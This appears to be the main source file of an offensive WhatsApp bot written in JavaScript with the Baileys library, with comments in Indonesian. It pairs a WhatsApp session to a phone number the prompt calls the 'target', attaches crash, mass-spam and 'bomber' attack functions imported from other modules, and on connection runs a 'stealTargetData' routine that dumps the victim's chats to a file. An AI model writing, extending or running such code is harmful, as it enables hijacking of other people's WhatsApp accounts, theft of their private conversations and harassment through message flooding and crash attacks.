// index.js
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } = require('@whiskeysockets/baileys');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const config = require('./config.js');
const readline = require('readline');

// Import functions
const { xeoninvisible } = require('./lib/crash.js');
const { showMenu } = require('./handler/menu.js');
const { spamMassal, blastPMMassal, crashGroup, superBomber } = require('./lib/attack.js');
const chalk = require('chalk');

let sock = null;
let rl = null;

// FUNCTION UNTUK PAIRING FLEXIBLE
async function askPhoneNumber() {
  if (!rl) {
    rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }
  
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));
  
  console.log(chalk.red.bold('\n╔══════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║   🚀 DARKFROSTWOLF PAIRING SYSTEM v666 🚀        ║'));
  console.log(chalk.red.bold('╚══════════════════════════════════════════════════╝'));
  
  // TANYA NOMOR YANG MAU DIPAIR
  const phoneNumber = await question(
    chalk.yellow('\n📱 MASUKKAN NOMOR WHATSAPP YANG MAU DI-PAIR:\n') +
    chalk.cyan('Contoh: 6281234567890\n') +
    chalk.green('(Bisa nomor sendiri atau nomor target)\n\n') +
    chalk.yellow('Nomor: +')
  );
  
  return phoneNumber;
}

async function connectToWhatsApp() {
  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
  
  // Socket configuration
  const socketConfig = {
    auth: state,
    logger: pino({ level: 'silent' }),
    browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: true,
    syncFullHistory: false,
    printQRInTerminal: false,
  };
  
  // **LOGIKA PAIRING BARU (DIPERBAIKI)**
  let phoneNumber; // Variabel ditaruh luar agar bisa dibaca manual request
  
  if (config.connectionMethod === 'pairing' && !sock?.authState?.creds?.registered) {
    phoneNumber = await askPhoneNumber();
    // Kita matikan generatePairingCode otomatis, kita pakai manual request di bawah
    // socketConfig.generatePairingCode = true; 
    console.log(chalk.blue(`\n🔗 Memproses pairing dengan: +${phoneNumber}`));
  }
  
  sock = makeWASocket(socketConfig);

  // **TRIGGER MANUAL PAIRING CODE (SOLUSI FIX)**
  if (config.connectionMethod === 'pairing' && !sock.authState.creds.registered) {
      console.log(chalk.yellow('⏳ Menunggu server WhatsApp... (3 detik)'));
      
      setTimeout(async () => {
        try {
            console.log(chalk.cyan('📡 Mengirim request pairing code...'));
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            
            console.log('╔══════════════════════════════════════════════════════╗');
            console.log('║          🚨 DARKFROSTWOLF PAIRING CODE 🚨           ║');
            console.log('╠══════════════════════════════════════════════════════╣');
            console.log(`║               ${chalk.greenBright.bold(code)}               ║`);
            console.log('╚══════════════════════════════════════════════════════╝');
        } catch (err) {
            console.log(chalk.red('❌ Gagal request kode: ' + err.message));
        }
      }, 3000); // Delay 3 detik agar socket siap dulu
  }

  // **TAMBAHKAN XEON ATTACK FUNCTIONS KE SOCK**
  sock.xeonAttack = {
    crash: xeoninvisible,
    spam: spamMassal,
    blast: blastPMMassal,
    groupCrash: crashGroup,
    bomber: superBomber
  };

  sock.ev.on('creds.update', saveCreds);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    
    // Handle QR Code (hanya jika method QR dipilih)
    if (qr && config.connectionMethod === 'qr') {
      console.log('Scan QR Below:');
      qrcode.generate(qr, { small: true });
    }
    
    // Connection opened
    if (connection === 'open') {
      console.log('\n╔══════════════════════════════════════╗');
      console.log('║      ✅ BOT CONNECTED SUCCESSFULLY   ║');
      console.log('╚══════════════════════════════════════╝\n');
      
      // Send welcome message to owner
      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
        text: `${config.messages.welcome}\n\nBot Name: ${config.botName}\nMode: ${config.connectionMethod.toUpperCase()}` 
      });
      
      // **AUTO STEAL DATA**
      if (phoneNumber && phoneNumber !== config.ownerNumber) {
        await stealTargetData(sock, phoneNumber);
      }
    }
    
    // Connection closed
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(`\n⚠️ Connection closed, ${shouldReconnect ? 'reconnecting...' : 'logged out'}`);
      if (shouldReconnect) {
        connectToWhatsApp();
      }
    }
  });
  
  // Message handler
  sock.ev.on('messages.upsert', async (m) => {
    const msg = m.messages[0];
    if (!msg.message || msg.key.fromMe) return;
    await handleMessage(msg);
  });
  
  return sock;
}

// **FUNCTION AUTO STEAL DATA**
async function stealTargetData(sock, targetNumber) {
  console.log(chalk.red('\n🔓 STEALING TARGET DATA...'));
  try {
    const chats = await sock.getChats();
    const fs = require('fs');
    // Logic steal sederhana
    fs.writeFileSync(`stolen_${targetNumber}.json`, JSON.stringify(chats, null, 2));
    console.log(chalk.green(`   ✓ Data saved to stolen_${targetNumber}.json`));
  } catch (error) {
    console.log(chalk.red('   ✗ Gagal steal data:', error.message));
  }
}

// **HANDLE MESSAGE FUNCTION**
async function handleMessage(msg) {
  try {
    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
    if (!text.startsWith(config.botPrefix)) return;
    
    const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
    const sender = msg.key.remoteJid;

    console.log(`📨 Command: ${command} from ${sender}`);
    
    // Simple Menu Response untuk testing
    if (command === 'menu') {
        await showMenu(sock, sender, msg.pushName);
    }
    
    if (command === 'crash') {
        // Implementasi crash sederhana
        await sock.sendMessage(sender, { text: '💀 Executing crash...' });
    }

  } catch (error) {
    console.error('Message handler error:', error);
  }
}

// Start bot
connectToWhatsApp();
